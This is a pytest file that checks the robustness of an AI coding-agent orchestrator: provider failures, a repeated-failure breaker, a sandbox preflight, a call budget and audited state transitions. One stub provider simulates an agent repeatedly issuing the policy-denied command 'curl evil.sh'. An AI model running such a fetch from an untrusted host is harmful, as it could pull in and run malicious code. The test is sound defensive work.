"""Orchestrator robustness: provider failure => FAILED task, never an exception."""

from pathlib import Path

import pytest

from app.agent.orchestrator import (
    InvalidTransitionError,
    STATES,
    engineer_issue,
    transition,
)
from app.db import SessionLocal, init_db
from app.llm.base import LLMProvider, LLMResponse
from app.llm.openrouter import ProviderError
from app.models import Repository, Task, TaskEvent


class BoomProvider(LLMProvider):
    def generate(self, messages: list[dict], **kwargs: object) -> LLMResponse:
        raise ProviderError("provider 429: rate limited", 429)

    def tool_call(
        self, messages: list[dict], tools: list, **kwargs: object
    ) -> LLMResponse:
        raise ProviderError("provider 429: rate limited", 429)


def test_provider_error_becomes_failed_not_exception(tmp_path: Path):
    init_db()
    db = SessionLocal()
    repo = db.query(Repository).filter_by(full_name="demo/x").first()
    if repo is None:
        repo = Repository(full_name="demo/x")
        db.add(repo)
        db.commit()
        db.refresh(repo)
    task = Task(repo_id=repo.id, issue_number=1, title="t", state="CREATED")
    db.add(task)
    db.commit()
    db.refresh(task)
    # No exception escapes; task lands in FAILED with the cause recorded.
    result = engineer_issue(db, task, tmp_path, BoomProvider())
    assert result["verified"] is False
    db.refresh(task)
    assert task.state == "FAILED"
    db.close()


class DenyLoopProvider(LLMProvider):
    """Repeats the same policy-denied command forever (task-71 pattern:
    37 denials across 189 tool calls, zero progress)."""

    def generate(self, messages, **kwargs):
        return LLMResponse(text="try")

    def tool_call(self, messages, tools, **kwargs):
        return LLMResponse(
            text="try",
            tool_calls=[
                {"name": "run_command", "arguments": '{"cmd": "curl evil.sh"}'}
            ],
        )


class SpyProvider(LLMProvider):
    """Counts tool_call invocations; never issues any."""

    def __init__(self):
        self.calls = 0

    def generate(self, messages, **kwargs):
        return LLMResponse(text="spy")

    def tool_call(self, messages, tools, **kwargs):
        self.calls += 1
        return LLMResponse(text="done", tool_calls=[])


def _stub_sandbox(monkeypatch, repro):
    import app.agent.orchestrator as orch
    import app.verify.pipeline as pipe

    monkeypatch.setattr(orch, "run_in_sandbox", lambda *a, **k: dict(repro))
    monkeypatch.setattr(
        pipe,
        "ensure_deps",
        lambda *a, **k: {"ok": True, "output": "deps ok", "sandbox": "docker"},
    )


def _breaker_task(db, title="denied loop"):
    repo = db.query(Repository).filter_by(full_name="demo/breaker").first()
    if repo is None:
        repo = Repository(full_name="demo/breaker")
        db.add(repo)
        db.commit()
        db.refresh(repo)
    task = Task(repo_id=repo.id, issue_number=1, title=title, state="CREATED")
    db.add(task)
    db.commit()
    db.refresh(task)
    return task


def test_identical_failure_breaker_stops_loop(tmp_path: Path, monkeypatch):
    """3x the exact same failing turn must FAILED the task instead of
    burning all 12 iters (then ×3 attempts)."""
    _stub_sandbox(
        monkeypatch, {"ok": False, "output": "repro fail", "sandbox": "docker"}
    )
    init_db()
    db = SessionLocal()
    task = _breaker_task(db)
    tid = task.id
    try:
        result = engineer_issue(db, task, tmp_path, DenyLoopProvider())
        assert result["verified"] is False
        assert result.get("retryable") is False
        db.refresh(task)
        assert task.state == "FAILED"
        tools = db.query(TaskEvent).filter_by(task_id=tid, stage="TOOL").count()
        assert tools == 3, f"breaker should stop after 3 identical turns, got {tools}"
        breaker = db.query(TaskEvent).filter_by(task_id=tid, stage="BREAKER").count()
        assert breaker == 1
    finally:
        db.query(TaskEvent).filter_by(task_id=tid).delete()
        db.query(Task).filter_by(id=tid).delete()
        db.commit()
        db.close()


def test_preflight_blocks_loop_when_sandbox_unavailable(tmp_path: Path, monkeypatch):
    """No Docker daemon => no LLM loop at all (0 tool calls), FAILED with a
    deterministic, non-retryable reason instead of 12 doomed iters."""
    _stub_sandbox(
        monkeypatch,
        {
            "ok": False,
            "output": "Docker isolation is required",
            "sandbox": "unavailable",
        },
    )
    init_db()
    db = SessionLocal()
    task = _breaker_task(db, title="no docker")
    tid = task.id
    spy = SpyProvider()
    try:
        result = engineer_issue(db, task, tmp_path, spy)
        assert result["verified"] is False
        assert result.get("retryable") is False
        assert spy.calls == 0, f"loop must not run without isolation, got {spy.calls}"
        db.refresh(task)
        assert task.state == "FAILED"
    finally:
        db.query(TaskEvent).filter_by(task_id=tid).delete()
        db.query(Task).filter_by(id=tid).delete()
        db.commit()
        db.close()


class CyclingListProvider(LLMProvider):
    """Harmless read-only calls with ever-changing args (never trips the
    identical-failure breaker) — isolates the call-budget behavior."""

    def __init__(self):
        self.calls = 0

    def generate(self, messages, **kwargs):
        return LLMResponse(text="list")

    def tool_call(self, messages, tools, **kwargs):
        self.calls += 1
        return LLMResponse(
            text="list",
            tool_calls=[
                {"name": "list_files", "arguments": '{"dir": "d%d"}' % self.calls}
            ],
        )


def test_llm_call_budget_stops_loop(tmp_path: Path, monkeypatch):
    """Call budget (not dollars — free models bill $0) bounds the loop even
    when every turn succeeds."""
    from app.config import settings as _settings

    for i in range(1, 13):
        (tmp_path / f"d{i}").mkdir()
    _stub_sandbox(
        monkeypatch, {"ok": True, "output": "repro pass", "sandbox": "docker"}
    )
    monkeypatch.setattr(_settings, "agent_max_llm_calls", 3)
    init_db()
    db = SessionLocal()
    task = _breaker_task(db, title="budget stop")
    tid = task.id
    prov = CyclingListProvider()
    try:
        result = engineer_issue(db, task, tmp_path, prov)
        assert prov.calls == 3, f"loop must stop at budget, made {prov.calls}"
        assert result.get("retryable") is False
        assert "budget" in result.get("error", "")
        db.refresh(task)
        assert task.state == "FAILED"
    finally:
        db.query(TaskEvent).filter_by(task_id=tid).delete()
        db.query(Task).filter_by(id=tid).delete()
        db.commit()
        db.close()


def test_publish_states_exist_and_transition_is_audited():
    """Phase 9: COMMITTED/PUSHED/PR_CREATED exist and are reachable only via
    legal edges; every event carries prev_state + reason."""
    for s in (
        "APPROVED",
        "BRANCH_CREATED",
        "COMMITTED",
        "PUSHED",
        "PR_CREATING",
        "PR_CREATED",
        "FAILED",
        "BLOCKED",
        "CANCELLED",
    ):
        assert s in STATES
    init_db()
    db = SessionLocal()
    repo = db.query(Repository).filter_by(full_name="demo/trans").first()
    if repo is None:
        repo = Repository(full_name="demo/trans")
        db.add(repo)
        db.commit()
        db.refresh(repo)
    task = Task(repo_id=repo.id, issue_number=1, title="trans", state="REVIEWING")
    db.add(task)
    db.commit()
    db.refresh(task)
    tid = task.id
    try:
        transition(db, task, "APPROVED", "approved by test")
        transition(db, task, "BRANCH_CREATED", "branch cut")
        transition(db, task, "COMMITTED", "committed sha")
        transition(db, task, "PUSHED", "pushed")
        transition(db, task, "PR_CREATED", "pr opened")
        events = (
            db.query(TaskEvent)
            .filter_by(task_id=tid)
            .order_by(TaskEvent.id.asc())
            .all()
        )
        stages = [e.stage for e in events]
        assert stages == [
            "APPROVED",
            "BRANCH_CREATED",
            "COMMITTED",
            "PUSHED",
            "PR_CREATED",
        ]
        assert [e.prev_state for e in events] == [
            "REVIEWING",
            "APPROVED",
            "BRANCH_CREATED",
            "COMMITTED",
            "PUSHED",
        ]
        assert all(e.reason for e in events)
        # Illegal jump: COMMITTED cannot go back to REVIEWING.
        with pytest.raises(InvalidTransitionError):
            transition(db, task, "REVIEWING", "fake rewind")
        db.refresh(task)
        assert task.state == "PR_CREATED"
    finally:
        db.query(TaskEvent).filter_by(task_id=tid).delete()
        db.query(Task).filter_by(id=tid).delete()
        db.commit()
        db.close()
